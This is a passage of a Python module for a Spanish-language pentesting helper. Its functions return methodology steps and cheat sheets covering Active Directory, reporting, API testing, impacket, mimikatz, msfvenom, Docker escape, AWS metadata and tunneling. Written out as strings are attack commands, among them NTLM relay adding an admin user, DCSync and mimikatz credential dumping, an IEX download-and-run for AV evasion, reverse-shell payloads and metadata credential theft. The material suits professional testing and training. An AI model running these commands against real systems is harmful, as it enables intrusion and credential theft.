                        "# Paso 2: Responder en modo escucha (sin SMB/HTTP para no interferir):",
                        "sudo responder -I eth0 -d -P",
                        "",
                        "# Paso 3: ntlmrelayx apuntando a los targets:",
                        "sudo impacket-ntlmrelayx -tf relay_targets.txt -smb2support",
                        "# Con comando: -c 'net user hacker Password123! /add && net localgroup administrators hacker /add'",
                        "",
                        "# Provocar autenticación: enviar UNC path al objetivo → \\\\<KALI_IP>\\share",
                    ],
                    "por_que": "NTLM relay captura hashes NTLM y los usa inmediatamente contra "
                    "otros hosts. No necesita crackear — reutiliza el hash directamente. "
                    "Muy común en redes corporativas con SMB signing deshabilitado.",
                },
                {
                    "n": 7,
                    "nombre": "DCSync — volcado de todos los hashes del dominio",
                    "comandos": [
                        "# Requiere permisos de replicación (DS-Replication-Get-Changes-All)",
                        "# Comprobar en BloodHound: 'Find Principals with DCSync Rights'",
                        "",
                        "impacket-secretsdump <DOMAIN>/<user>:<pass>@<DC_IP> -just-dc",
                        "impacket-secretsdump <DOMAIN>/<user>:<pass>@<DC_IP> -just-dc-user Administrator",
                        "",
                        "# Con el hash del krbtgt → Golden Ticket:",
                        "impacket-ticketer -nthash <krbtgt_hash> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn cifs/<DC_FQDN> administrator",
                    ],
                    "por_que": "DCSync simula el proceso de replicación del DC. Cualquier "
                    "usuario con permisos de replicación puede volcar todos los "
                    "hashes NTLM del dominio — incluido el hash del Administrator. "
                    "Es la escalada final en la mayoría de auditorías AD.",
                },
            ],
            "notas_profesionales": [
                "BloodHound es la herramienta más importante de AD — aprenderla bien "
                "es lo que diferencia un pentester junior de uno senior.",
                "En auditorías reales el path suele ser: "
                "credencial débil → Kerberoasting → ACL abuse → DA. "
                "Raramente hay exploits de kernel involucrados.",
                "Documentar cada escalada con: usuario origen, permiso abusado, "
                "usuario destino, herramienta usada. Es lo que se escribe en el reporte.",
                "impacket es la suite estándar — conocer todos sus módulos es esencial.",
            ],
        },
        "reporting": {
            "nombre": "Fase de Reporting — Documentación profesional",
            "objetivo": (
                "Convertir los hallazgos técnicos en un entregable profesional. "
                "Esta fase define si eres contratado de nuevo. "
                "Un pentest sin reporte no existe."
            ),
            "pasos": [
                {
                    "n": 1,
                    "nombre": "Estructura estándar de un reporte de pentest",
                    "contenido": {
                        "portada": [
                            "Nombre del cliente y proyecto",
                            "Fecha de realización y de entrega",
                            "Nombre del auditor / empresa",
                            "Clasificación del documento (Confidencial)",
                            "Versión del documento",
                        ],
                        "resumen_ejecutivo": [
                            "Escrito para dirección — sin tecnicismos",
                            "Objetivo del pentest en 2-3 párrafos",
                            "Número total de hallazgos por severidad (gráfico)",
                            "Los 3 hallazgos más críticos en lenguaje de negocio",
                            "Valoración global del nivel de seguridad",
                            "Recomendación principal",
                        ],
                        "alcance": [
                            "IPs / dominios / aplicaciones en scope",
                            "IPs / sistemas fuera de scope",
                            "Fechas y ventanas de testing",
                            "Tipo de prueba (caja negra / gris / blanca)",
                            "Credenciales proporcionadas (si caja gris/blanca)",
                        ],
                        "metodologia": [
                            "Framework usado: PTES / OWASP WSTG / NIST",
                            "Fases ejecutadas con fechas",
                            "Herramientas utilizadas (lista)",
                            "Limitaciones encontradas",
                        ],
                        "hallazgos_tecnicos": [
                            "Un hallazgo por sección — ver formato en paso 2",
                        ],
                        "remediaciones": [
                            "Lista ordenada por prioridad",
                            "Quick wins (fácil de remediar, alto impacto)",
                            "Remediaciones a largo plazo",
                        ],
                        "apendices": [
                            "Screenshots y evidencias",
                            "Output de herramientas relevante",
                            "Listado completo de IPs escaneadas",
                        ],
                    },
                },
                {
                    "n": 2,
                    "nombre": "Formato estándar por hallazgo — el más importante",
                    "template": {
                        "titulo": "Nombre descriptivo (ej: 'Inyección SQL en parámetro id de /api/users')",
                        "severidad": "Crítica / Alta / Media / Baja / Informativa",
                        "cvss_score": "Puntuación CVSS v3.1 (usar calculator: https://www.first.org/cvss/calculator/3.1)",
                        "descripcion": "Qué es la vulnerabilidad en 2-3 párrafos. Sin asumir conocimiento técnico del lector.",
                        "impacto": "Qué puede hacer un atacante si explota esto. En términos de negocio (pérdida de datos, servicio caído, acceso no autorizado).",
                        "evidencia": [
                            "Screenshot del exploit funcionando",
                            "Request/Response de Burp",
                            "Output del comando que demuestra el acceso",
                        ],
                        "pasos_reproduccion": [
                            "1. Ir a URL...",
                            "2. Ejecutar comando...",
                            "3. Resultado obtenido...",
                        ],
                        "remediacion": "Qué debe hacer el cliente para solucionarlo. Concreto y accionable.",
                        "referencias": [
                            "CVE-XXXX-XXXXX",
                            "OWASP Top 10: A03:2021 - Injection",
                            "https://cwe.mitre.org/data/definitions/89.html",
                        ],
                    },
                },
                {
                    "n": 3,
                    "nombre": "Escala de severidad CVSS — cómo clasificar hallazgos",
                    "escala": {
                        "Crítica (9.0-10.0)": "RCE sin autenticación, acceso a toda la infraestructura, exfiltración masiva de datos",
                        "Alta (7.0-8.9)": "RCE con autenticación, SQL injection con acceso a BD, escalada a admin",
                        "Media (4.0-6.9)": "XSS persistente, IDOR acceso a datos de otros usuarios, misconfiguraciones explotables",
                        "Baja (0.1-3.9)": "XSS reflejado sin impacto real, versiones desactualizadas sin exploit público, headers de seguridad ausentes",
                        "Informativa (0.0)": "Mejoras de hardening, configuraciones subóptimas, ausencia de best practices sin riesgo inmediato",
                    },
                    "calculadora": "https://www.first.org/cvss/calculator/3.1",
                },
                {
                    "n": 4,
                    "nombre": "Herramientas de reporting estándar en la industria",
                    "herramientas": [
                        {
                            "nombre": "Ghostwriter",
                            "descripcion": "Plataforma open source de gestión de pentests y reportes colaborativos",
                            "url": "https://github.com/GhostManager/Ghostwriter",
                            "uso": "Estándar en empresas de pentesting profesionales",
                        },
                        {
                            "nombre": "PlexTrac",
                            "descripcion": "SaaS de reporting y gestión de vulnerabilidades",
                            "url": "https://plextrac.com",
                            "uso": "Común en consultoras grandes",
                        },
                        {
                            "nombre": "Dradis",
                            "descripcion": "Plataforma colaborativa de reporting con templates",
                            "url": "https://dradisframework.com",
                            "uso": "Versión Community gratuita suficiente para empezar",
                        },
                        {
                            "nombre": "SysReptor",
                            "descripcion": "Plataforma moderna self-hosted, buena UX, open source",
                            "url": "https://github.com/Syslifters/sysreptor",
                            "uso": "Muy usado en entornos OSCP y auditorías individuales",
                        },
                        {
                            "nombre": "Obsidian + templates",
                            "descripcion": "Para pentests individuales: tomar notas en tiempo real con estructura",
                            "url": "https://obsidian.md",
                            "uso": "Muy usado en CTFs y aprendizaje — base para el reporte final",
                        },
                    ],
                },
                {
                    "n": 5,
                    "nombre": "Hábitos de documentación durante el pentest",
                    "practicas": [
                        "Capturar SIEMPRE screenshot o output antes de continuar — el acceso puede no reproducirse",
                        "Anotar timestamps de cada acción (herramienta, comando, resultado)",
                        "Guardar todos los outputs con -oN/-oA/-o para análisis posterior",
                        "Mantener un log de comandos ejecutados (script o tmux logging)",
                        "Documentar los intentos fallidos también — muestra exhaustividad al cliente",
                        "Para cada vuln: request completo (Burp) + response + screenshot de impacto",
                    ],
                },
            ],
            "notas_profesionales": [
                "El resumen ejecutivo es lo que lee el CISO/CEO — es lo más importante del documento.",
                "CVSS mal calculado destruye credibilidad. Usar la calculadora oficial siempre.",
                "Las remediaciones deben ser accionables, no solo 'actualizar el software'.",
                "Un reporte bien escrito es tu portfolio — es lo que enseñas en entrevistas.",
                "Ghostwriter + Obsidian para notas en tiempo real es el setup más común en junior positions.",
            ],
        },
        "api_testing": {
            "nombre": "API Testing — REST y GraphQL",
            "objetivo": (
                "Las APIs modernas son la superficie de ataque más grande en "
                "aplicaciones actuales. Metodología específica para REST y GraphQL."
            ),
            "pasos": [
                {
                    "n": 1,
                    "nombre": "Reconocimiento y documentación de la API",
                    "comandos": [
                        "# Buscar documentación expuesta:",
                        "gobuster dir -u http://<IP>/api -w /usr/share/wordlists/dirb/common.txt",
                        "# Endpoints comunes a verificar:",
                        "curl http://<IP>/swagger.json",
                        "curl http://<IP>/swagger/v1/swagger.json",
                        "curl http://<IP>/api/docs",
                        "curl http://<IP>/openapi.json",
                        "curl http://<IP>/api-docs",
                        "curl http://<IP>/graphql  # GraphQL endpoint",
                        "curl http://<IP>/graphql?query={__schema{types{name}}}  # introspection",
                    ],
                    "por_que": "Swagger/OpenAPI expuesto da la lista completa de endpoints, "
                    "parámetros y autenticación. La introspección de GraphQL "
                    "muestra el schema completo sin autenticación si está habilitada.",
                },
                {
                    "n": 2,
                    "nombre": "Autenticación y autorización",
                    "comandos": [
                        "# Test de endpoints sin autenticación:",
                        "curl -s http://<IP>/api/v1/users  # sin token",
                        "curl -s http://<IP>/api/v1/admin",
                        "",
                        "# Test de IDOR en recursos:",
                        "curl -H 'Authorization: Bearer <TOKEN_USER_A>' http://<IP>/api/v1/users/2",
                        "# Cambiar el ID al de otro usuario",
                        "",
                        "# JWT manipulation (si usa JWT):",
                        "# Decodificar en jwt.io, modificar claims, probar alg:none",
                        "",
                        "# Mass assignment (enviar campos no esperados):",
                        'curl -X POST http://<IP>/api/v1/users -d \'{"username":"test","role":"admin"}\'',
                    ],
                    "por_que": "Las APIs suelen implementar autenticación pero fallar en "
                    "autorización. IDOR y mass assignment son los dos vectores "
                    "más frecuentes en OWASP API Security Top 10.",
                },
                {
                    "n": 3,
                    "nombre": "Fuzzing de parámetros y endpoints",
                    "comandos": [
                        "# Wordlist específica de APIs:",
                        "ffuf -u http://<IP>/api/v1/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt",
                        "",
                        "# Fuzzing de parámetros:",
                        "ffuf -u 'http://<IP>/api/v1/users?FUZZ=1' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs <SIZE>",
                        "",
                        "# HTTP method fuzzing:",
                        "for method in GET POST PUT DELETE PATCH OPTIONS HEAD; do",
                        '  echo -n "$method: "; curl -s -o /dev/null -w "%{http_code}" -X $method http://<IP>/api/v1/users',
                        "  echo",
                        "done",
                    ],
                    "por_que": "Los endpoints no documentados y los métodos HTTP no esperados "
                    "son superficies de ataque frecuentes en APIs legacy.",
                },
            ],
            "notas_profesionales": [
                "OWASP API Security Top 10 es la referencia obligatoria: "
                "https://owasp.org/API-Security/editions/2023/en/0x11-t10/",
                "Burp Suite con la extensión 'REST-GraphQL' mejora significativamente el testing.",
                "Las APIs GraphQL requieren herramientas específicas: graphw00f (fingerprint), "
                "clairvoyance (wordlist enum cuando introspection está deshabilitada).",
            ],
        },
    }

    phase_key = phase.lower().strip().replace(" ", "_").replace("-", "_")
    if phase_key not in phases:
        return {
            "status": "not_found",
            "message": f"Fase '{phase}' no reconocida en este módulo.",
            "available": ", ".join(phases.keys()),
            "note": "Para fases base (recon, web, smb, privesc, passwords, pivoting) "
            "usar generate_pentest_commands().",
        }

    data = phases[phase_key]
    return {
        "status": "success",
        "phase": data["nombre"],
        "objective": data["objetivo"],
        "steps": data["pasos"],
        "professional_notes": data["notas_profesionales"],
        "context": context or "Sin contexto adicional",
    }


# ============================================================================
# BLOQUE 4 — CHEATSHEETS NUEVAS: impacket, mimikatz, msfvenom, docker-escape,
#            cloud-basics, enum4linux-deep, api-testing
# ============================================================================


def get_cheatsheet_extended(topic: str) -> dict:
    """Cheatsheets adicionales que complementan get_cheatsheet().

    Cubre las herramientas profesionales no incluidas en la base:
    impacket, mimikatz, msfvenom, docker-escape, cloud, enum4linux.

    Args:
        topic: impacket | mimikatz | msfvenom | docker-escape |
               cloud-aws | enum4linux | chisel-ligolo | methodology-ptes |
               methodology-owasp | owasp-top10 | owasp-api-top10

    Returns:
        dict con cheatsheet completo.
    """
    sheets = {
        "impacket": """
╔══════════════════════════════════════════════════╗
║  IMPACKET — Suite estándar AD/Windows attacks    ║
╚══════════════════════════════════════════════════╝

EJECUCIÓN REMOTA:
  impacket-psexec <domain>/<user>:<pass>@<IP>          # SYSTEM via SMB + named pipe
  impacket-smbexec <domain>/<user>:<pass>@<IP>         # sin escribir binario al disco
  impacket-wmiexec <domain>/<user>:<pass>@<IP>         # via WMI, menos detectable
  impacket-atexec <domain>/<user>:<pass>@<IP> <cmd>    # via Task Scheduler
  impacket-dcomexec <domain>/<user>:<pass>@<IP>        # via DCOM

  # Con hash (Pass-the-Hash):
  impacket-psexec -hashes :<NT_hash> <user>@<IP>
  impacket-wmiexec -hashes aad3b::<NT_hash> <domain>/<user>@<IP>

SECRETSDUMP — volcado de credenciales:
  impacket-secretsdump <domain>/<user>:<pass>@<IP>     # SAM + LSA + cached creds
  impacket-secretsdump <domain>/<user>:<pass>@<DC>  -just-dc        # NTDS.dit (todo el dominio)
  impacket-secretsdump <domain>/<user>:<pass>@<DC>  -just-dc-user Administrator
  impacket-secretsdump LOCAL -sam SAM -system SYSTEM   # offline con archivos

KERBEROS:
  impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <DC> -request   # Kerberoasting
  impacket-GetNPUsers <domain>/ -usersfile users.txt -dc-ip <DC> -no-pass  # AS-REP Roasting
  impacket-ticketer -nthash <hash> -domain-sid <SID> -domain <domain> admin  # Golden Ticket

SMB / LDAP:
  impacket-smbclient <domain>/<user>:<pass>@<IP>
  impacket-smbserver share . -smb2support                # servidor SMB para transferir archivos
  impacket-lookupsid <domain>/<user>:<pass>@<IP>         # enumerar SIDs

RELAY:
  impacket-ntlmrelayx -tf targets.txt -smb2support
  impacket-ntlmrelayx -tf targets.txt -smb2support -c 'net user hacker P@ss123 /add'
""",
        "mimikatz": """
╔══════════════════════════════════════════════════╗
║  MIMIKATZ — Extracción de credenciales Windows   ║
╚══════════════════════════════════════════════════╝

PREREQUISITOS: SYSTEM o SeDebugPrivilege

COMANDOS ESENCIALES:
  privilege::debug              # habilitar SeDebugPrivilege
  token::elevate                # impersonar SYSTEM

VOLCADO DE CREDENCIALES:
  sekurlsa::logonpasswords      # contraseñas en texto claro + hashes de sesiones activas
  sekurlsa::wdigest             # credenciales WDigest (requiere Win7/2008 sin parche)
  lsadump::sam                  # hashes del SAM (requiere SYSTEM)
  lsadump::secrets              # LSA secrets
  lsadump::dcsync /user:Administrator  # DCSync — simular replicación DC
  lsadump::dcsync /all /csv     # DCSync de todos los usuarios

PASS-THE-HASH / PASS-THE-TICKET:
  sekurlsa::pth /user:Admin /domain:<DOMAIN> /ntlm:<HASH> /run:cmd.exe
  kerberos::list                # ver tickets Kerberos actuales
  kerberos::ptt ticket.kirbi    # inyectar ticket (Pass-the-Ticket)
  kerberos::golden /user:admin /domain:<DOMAIN> /sid:<SID> /krbtgt:<HASH> /ptt

GOLDEN / SILVER TICKET:
  # Golden Ticket: usa hash de krbtgt → acceso permanente al dominio
  kerberos::golden /user:Administrator /domain:<DOMAIN> /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /ptt

EVASIÓN AV (comandos en memoria sin tocar disco):
  # Desde PowerShell:
  IEX(New-Object Net.WebClient).downloadString('http://<IP>/Invoke-Mimikatz.ps1')
  Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'

ALTERNATIVA: CrackMapExec (sin subir mimikatz):
  crackmapexec smb <IP> -u admin -p pass -M mimikatz
""",
        "msfvenom": """
╔══════════════════════════════════════════════════╗
║  MSFVENOM — Generación de payloads               ║
╚══════════════════════════════════════════════════╝

LISTAR PAYLOADS:
  msfvenom -l payloads | grep -i "linux/x64"
  msfvenom -l payloads | grep -i "windows/x64"
  msfvenom -l formats    # formatos de salida disponibles

LINUX — ELF reverse shell:
  msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f elf -o shell.elf
  msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f elf -o shell.elf

WINDOWS — EXE reverse shell:
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f exe -o shell.exe
  msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=443 -f exe -o shell.exe

WINDOWS — DLL injection:
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f dll -o malicious.dll

WEBSHELLS:
  msfvenom -p php/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f raw -o shell.php
  msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=4444 -f raw -o shell.jsp
  msfvenom -p java/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f war -o shell.war  # Tomcat

ENCODED (bypass AV básico):
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -e x64/xor_dynamic -i 5 -f exe -o encoded.exe

LISTENER EN METASPLOIT:
  use exploit/multi/handler
  set PAYLOAD windows/x64/meterpreter/reverse_tcp
  set LHOST <IP>
  set LPORT 4444
  set ExitOnSession false    # no cerrar el handler al recibir sesión
  run -j                     # en background
""",
        "docker-escape": """
╔══════════════════════════════════════════════════╗
║  DOCKER ESCAPE — Escalada desde contenedor       ║
╚══════════════════════════════════════════════════╝

IDENTIFICAR QUE ESTÁS EN UN CONTENEDOR:
  cat /.dockerenv           # existe → estás en Docker
  cat /proc/1/cgroup        # contiene "docker"
  hostname                  # suele ser hash corto
  ip a                      # red 172.17.x.x es red Docker por defecto

VECTORES DE ESCAPE:

1. Docker socket montado (el más común):
  ls -la /var/run/docker.sock   # si existe → escape trivial
  # Montar el filesystem del host:
  docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh
  # O crear contenedor privilegiado:
  docker -H unix:///var/run/docker.sock run --privileged --pid=host -it alpine nsenter -t 1 -m -u -n -i sh

2. Contenedor privilegiado (--privileged):
  cat /proc/self/status | grep CapEff   # si CapEff: 0000003fffffffff → privilegiado
  # Montar disco del host:
  fdisk -l                              # ver discos
  mkdir /mnt/host && mount /dev/sda1 /mnt/host
  chroot /mnt/host sh                   # shell en el host

3. Capabilities peligrosas:
  capsh --print | grep cap_sys_admin    # cap_sys_admin → escape posible
  # cap_net_admin, cap_sys_ptrace también son explotables

4. Escape via cgroups release_agent:
  # Requiere cap_sys_admin
  # Ver: https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/

ENUMERAR DESDE EL CONTENEDOR:
  env | grep -iE "secret|pass|key|token"   # variables de entorno con credenciales
  cat /proc/net/fib_trie | grep -E "32 HOST" | awk '{print $2}'  # IPs de la red interna
  for i in $(seq 1 254); do (ping -c1 -W1 172.17.0.$i 2>/dev/null | grep 'bytes from') &done
""",
        "cloud-aws": """
╔══════════════════════════════════════════════════╗
║  CLOUD — AWS Metadata y vectores básicos         ║
╚══════════════════════════════════════════════════╝

METADATA SERVICE (IMDSv1 — vulnerable a SSRF):
  curl http://169.254.169.254/latest/meta-data/
  curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
  curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>
  # → devuelve AccessKeyId, SecretAccessKey, Token temporales

IMDSv2 (requiere token previo):
  TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
  curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/

CON CREDENCIALES AWS OBTENIDAS:
  aws configure  # introducir AccessKeyId + SecretAccessKey + Token
  aws sts get-caller-identity          # quién soy
  aws iam get-user                     # info del usuario/rol
  aws iam list-attached-user-policies  # políticas del usuario
  aws s3 ls                            # listar todos los S3 buckets accesibles
  aws s3 ls s3://<bucket-name>
  aws s3 cp s3://<bucket>/<file> .     # descargar archivo

S3 BUCKETS PÚBLICOS:
  aws s3 ls s3://<bucket-name> --no-sign-request   # sin autenticación
  # Probar: empresa-backup, empresa-dev, empresa-logs, empresa-data

AZURE METADATA:
  curl -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | python3 -m json.tool
  curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

HERRAMIENTAS:
  pacu        # AWS exploitation framework (equivalente a metasploit para AWS)
  ScoutSuite  # auditoría de seguridad multi-cloud
  Prowler     # compliance y hardening AWS
""",
        "chisel-ligolo": """
╔══════════════════════════════════════════════════╗
║  TUNNELING — Chisel y Ligolo-ng                  ║
╚══════════════════════════════════════════════════╝

── CHISEL ────────────────────────────────────────

SERVER (Kali):
  ./chisel server -p 8888 --reverse

CLIENT (target):
  ./chisel client <KALI_IP>:8888 R:socks          # SOCKS5 proxy dinámico
  ./chisel client <KALI_IP>:8888 R:1080:socks     # en puerto específico
  ./chisel client <KALI_IP>:8888 R:8080:<INTERNAL_IP>:80  # port forwarding específico

USAR CON PROXYCHAINS:
  # /etc/proxychains4.conf: socks5 127.0.0.1 1080
  proxychains nmap -sT -Pn <INTERNAL_IP>
  proxychains curl http://<INTERNAL_IP>

── LIGOLO-NG (más moderno y limpio) ──────────────

SERVIDOR (Kali) — crea interfaz de red virtual:
  sudo ip tuntap add user kali mode tun ligolo
  sudo ip link set ligolo up
  ./proxy -selfcert -laddr 0.0.0.0:11601

AGENTE (target):
  ./agent -connect <KALI_IP>:11601 -ignore-cert

EN LA CONSOLA DE LIGOLO:
  session           # seleccionar sesión
  ifconfig          # ver interfaces del target (redes internas)
  start             # iniciar el tunel

AÑADIR RUTA EN KALI:
  sudo ip route add 192.168.1.0/24 dev ligolo  # subred interna del target
  # Ahora puedes acceder directamente a 192.168.1.x desde Kali sin proxychains

VENTAJAS LIGOLO vs CHISEL:
  ✅ No necesita proxychains
  ✅ Más rápido (tuntap vs SOCKS)
  ✅ UDP soportado
  ✅ Múltiples pivots en cadena
""",
        "owasp-top10": """
╔══════════════════════════════════════════════════╗
║  OWASP Top 10 (2021) — Referencia web pentest    ║
╚══════════════════════════════════════════════════╝

A01 — Broken Access Control (el más frecuente):
  IDOR, path traversal, CORS mal configurado, forzar navegación a rutas admin
  Test: cambiar IDs en requests, acceder a /admin sin autenticación

A02 — Cryptographic Failures:
  Datos sensibles en texto claro, TLS débil, contraseñas sin bcrypt/argon2
  Test: SSL Labs, tráfico HTTP, cookies sin Secure flag

A03 — Injection (SQL, LDAP, OS, NoSQL):
  ' OR 1=1--, UNION SELECT, OS injection en parámetros de comando
  Test: sqlmap, manual fuzzing con ' " ; --

A04 — Insecure Design:
  Lógica de negocio rota, flujos de compra manipulables, rate limiting ausente
  Test: análisis manual del flujo de la aplicación

A05 — Security Misconfiguration:
  Directorios de debug activos, credenciales por defecto, CORS permisivo (*)
  Test: nikto, headers, robots.txt, /.env, /actuator (Spring)

A06 — Vulnerable and Outdated Components:
  Versiones de frameworks/librerías con CVEs públicos
  Test: whatweb, retire.js, snyk, safety

A07 — Identification and Authentication Failures:
  Brute force sin lockout, tokens débiles, sesiones que no expiran
  Test: hydra, Burp Intruder, JWT sin verificación

A08 — Software and Data Integrity Failures:
  Deserialización insegura, CI/CD sin validación de integridad
  Test: ysoserial para Java, pickle exploit para Python

A09 — Security Logging and Monitoring Failures:
  Sin alertas de brute force, logs insuficientes
  Difícil de testear — preguntar al cliente en caja blanca

A10 — Server-Side Request Forgery (SSRF):
  Servidor hace peticiones a URLs del atacante, acceso a metadata cloud
  Test: http://169.254.169.254, http://127.0.0.1, Burp Collaborator

Referencia completa: https://owasp.org/Top10/
""",
        "owasp-api-top10": """
╔══════════════════════════════════════════════════╗
║  OWASP API Security Top 10 (2023)                ║
╚══════════════════════════════════════════════════╝

API1 — Broken Object Level Authorization (BOLA/IDOR):
  Cambiar IDs en endpoints: GET /api/users/2 → /api/users/1
  Test: Burp Intruder para iterar IDs

API2 — Broken Authentication:
  Tokens JWT con alg:none, tokens que no expiran, API keys en URLs
  Test: jwt.io para manipular, Burp para replay

API3 — Broken Object Property Level Authorization:
  Respuesta incluye campos no deberían verse (exceso de datos)
  Input acepta campos no esperados (mass assignment)
  Test: POST con campos extra: {"role": "admin", "is_staff": true}

API4 — Unrestricted Resource Consumption:
  Sin rate limiting, sin paginación límite
  Test: ffuf con alto rate, ver si hay lockout o throttling

API5 — Broken Function Level Authorization:
  Endpoints de admin accesibles por usuarios normales
  Test: probar GET /api/v1/admin con token de usuario normal

API6 — Unrestricted Access to Sensitive Business Flows:
  Comprar artículos a precio negativo, abusar de flujos de descuento
  Test: análisis manual de la lógica de negocio

API7 — Server Side Request Forgery:
  API hace fetch a URLs externas proporcionadas por el usuario
  Test: apuntar a http://169.254.169.254, http://internal-service

API8 — Security Misconfiguration:
  CORS *, debug endpoints activos, stacks traces expuestos
  Test: OPTIONS en todos los endpoints, /health /actuator /debug

API9 — Improper Inventory Management:
  Versiones antiguas de la API expuestas (/api/v1 cuando ya hay /api/v3)
  Test: ffuf fuzzing de versiones: v0, v1, v2, beta, dev, internal

API10 — Unsafe Consumption of APIs:
  La app consume APIs de terceros sin validar respuestas
  Difícil de testear desde exterior

Referencia: https://owasp.org/API-Security/
Herramienta: https://github.com/nicowillis/API-Pentesting-Checklist
""",
        "methodology-ptes": """
╔══════════════════════════════════════════════════╗
║  PTES — Penetration Testing Execution Standard   ║
╚══════════════════════════════════════════════════╝

Referencia: http://www.pentest-standard.org/

FASE 1 — Pre-engagement:
  □ Definir scope (IPs, dominios, aplicaciones en/fuera de alcance)
  □ Tipo de prueba (black/grey/white box)
  □ Reglas de engagement (ROE): horario, técnicas permitidas
  □ Credenciales de prueba (si grey/white)
  □ Contacto de emergencia del cliente
  □ Autorización escrita y firmada → SIN ESTO NO EMPEZAR
  □ Plan de comunicación de hallazgos críticos (0-days, acceso a datos)

FASE 2 — Intelligence Gathering (OSINT):
  □ Reconocimiento pasivo: DNS, WHOIS, Google Dorks
  □ Reconocimiento de empleados (LinkedIn, redes sociales)
  □ Tecnologías identificadas
  □ Filtraciones conocidas (haveibeenpwned, GitHub)

FASE 3 — Threat Modeling:
  □ Identificar activos críticos del cliente
  □ Valorar qué puede impactar más al negocio
  □ Priorizar vectores de ataque según el modelo de amenazas

FASE 4 — Vulnerability Analysis:
  □ Escaneos automatizados (nmap, nikto, openvas)
  □ Análisis manual de los resultados
  □ Correlación de versiones con CVEs

FASE 5 — Exploitation:
  □ Intentar acceso inicial por los vectores identificados
  □ Documentar cada intento (éxito y fallo)
  □ NO destruir evidencia ni datos del cliente

FASE 6 — Post-exploitation:
  □ Escalada de privilegios
  □ Movimiento lateral
  □ Captura de evidencias (flags, screenshots, datos sensibles mínimos)
  □ Pivot a otros segmentos si está en scope

FASE 7 — Reporting:
  □ Resumen ejecutivo
  □ Hallazgos técnicos con severidad CVSS
  □ Evidencias reproducibles
  □ Remediaciones accionables
  □ Conclusiones y próximos pasos
""",
        "enum4linux": """
╔══════════════════════════════════════════════════╗
║  ENUM4LINUX / LDAP — Enumeración SMB/AD          ║
╚══════════════════════════════════════════════════╝

ENUM4LINUX (SMB/Samba):
  enum4linux -a <IP>                    # todo: usuarios, grupos, shares, policy
  enum4linux -U <IP>                    # solo usuarios
  enum4linux -S <IP>                    # solo shares
  enum4linux -G <IP>                    # solo grupos
  enum4linux -P <IP>                    # política de contraseñas
  enum4linux -a <IP> 2>&1 | tee enum4linux.txt   # guardar output

ENUM4LINUX-NG (versión mejorada):
  enum4linux-ng -A <IP>                 # equivalente a -a pero más moderno
  enum4linux-ng -A <IP> -u user -p pass # con credenciales
  enum4linux-ng -A <IP> -oY output.yaml # guardar en YAML

LDAP (cuando tienes credenciales de dominio):
  ldapsearch -x -H ldap://<DC_IP> -b "DC=<domain>,DC=<tld>" -D "<user>@<domain>" -w <pass>
  ldapsearch -x -H ldap://<DC_IP> -b "DC=empresa,DC=local" "(objectClass=user)" sAMAccountName
  ldapsearch -x -H ldap://<DC_IP> -b "DC=empresa,DC=local" "(objectClass=group)" cn member

LDAPDOMAINDUMP (más cómodo):
  ldapdomaindump -u '<domain>\\<user>' -p <pass> <DC_IP> -o ./ldap_output/
  # Genera HTMLs navegables con:
  # domain_users.html, domain_groups.html, domain_computers.html
  # domain_policy.html (política de contraseñas), domain_trusts.html

CRACKMAPEXEC para AD:
  crackmapexec ldap <DC_IP> -u <user> -p <pass> --users
  crackmapexec ldap <DC_IP> -u <user> -p <pass> --groups
  crackmapexec ldap <DC_IP> -u <user> -p <pass> --password-not-required  # AS-REP candidates
  crackmapexec ldap <DC_IP> -u <user> -p <pass> --admin-count  # privileged users
  crackmapexec ldap <DC_IP> -u <user> -p <pass> -M get-desc-users  # usuarios con descripción (a veces tienen pass)
""",
    }

    key = topic.lower().strip().replace(" ", "-").replace("_", "-")
    if key not in sheets:
        matches = [k for k in sheets if key in k or k in key]
        if matches:
            key = matches[0]

    if key in sheets:
        return {
            "status": "success",
            "topic": key,
            "cheatsheet": sheets[key],
        }

    return {
        "status": "not_found",
        "error": f"'{topic}' no disponible en este módulo.",
        "available": ", ".join(sorted(sheets.keys())),
        "note": "Para cheatsheets base (nmap, gobuster, ffuf, metasploit, smb, etc.) usar get_cheatsheet().",
    }


# ============================================================================
# BLOQUE 5 — CONCEPTOS NUEVOS: XXE, CSRF, SSTI, LFI, deserialization,
#            ACL abuse AD, AS-REP roasting, DCSync, NTLM relay, BloodHound
# ============================================================================


def explain_concept_extended(concept: str) -> dict:
    """Conceptos adicionales no cubiertos en explain_concept().

    Complementa la base con: XXE, CSRF, SSTI, LFI/RFI, deserialization,
    ACL abuse, AS-REP roasting, DCSync, NTLM relay, BloodHound.

    Args:
        concept: Concepto a explicar. Ver available en el return si no encuentra.

    Returns:
        dict con explicación estructurada.
    """
    if not concept:
        return {"status": "error", "message": "Especifica el concepto."}

    concepts = {
        "xxe": {
            "nombre": "XXE — XML External Entity Injection",
            "definicion": "Vulnerabilidad en parsers XML que permite a un atacante definir entidades externas, lo que puede llevar a lectura de archivos locales, SSRF o RCE.",
            "mecanismo": (
